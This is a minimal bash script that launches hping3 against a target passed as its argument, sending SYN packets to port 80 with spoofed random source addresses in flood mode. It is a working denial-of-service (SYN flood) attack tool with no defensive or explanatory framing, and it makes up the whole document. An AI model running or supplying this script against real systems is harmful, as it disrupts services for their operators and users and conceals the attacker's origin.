#!/bin/bash
hping3 -c 4 -d 1460 -S -p 80 --rand-source --flood "$1"
